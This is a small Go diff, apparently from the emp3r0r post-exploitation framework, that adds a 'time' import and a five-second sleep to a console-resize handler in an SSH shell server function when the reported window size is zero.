@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -84,6 +85,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		resize_console := func() {
 			win := <-winCh
 			if win.Width <= 0 || win.Height <= 0 {
+				time.Sleep(5 * time.Second)
 				log.Printf("w/h is 0, aborting")
 			}
 			os.Setenv("TERM_SIZE", fmt.Sprintf("%dx%d", win.Width, win.Height))
